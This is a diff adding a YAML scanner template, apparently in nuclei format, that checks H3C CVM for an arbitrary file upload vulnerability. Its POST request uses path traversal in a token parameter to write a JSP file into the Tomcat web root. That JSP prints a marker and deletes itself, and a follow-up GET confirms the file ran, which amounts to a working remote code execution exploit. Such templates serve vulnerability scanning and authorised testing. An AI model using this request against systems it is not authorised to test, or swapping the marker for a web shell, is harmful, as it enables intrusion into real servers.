@@ -1,0 +1,35 @@
+id: yaml-poc-h3c-cvm-file_upload-CT-479112
+info:
+  name: Yaml Poc H3C Cvm File_Upload Ct 479112
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-h3c-cvm-file_upload-CT-479112'
+  tags: fileupload
+  reference:
+  - https://github.com/MY0723/goby-poc/blob/goby-poc/H3C%20CVM%20Arbitrary%20File%20Upload%20Vulnerability.go
+http:
+- method: POST
+  path:
+  - /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{c}}.jsp
+  body: <%out.println("{{a}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Content-range: bytes 0-10/20
+    Referer: '{{b}}cas/login'
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - success
+- method: GET
+  path:
+  - /cas/js/lib/buttons/{{c}}.jsp
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
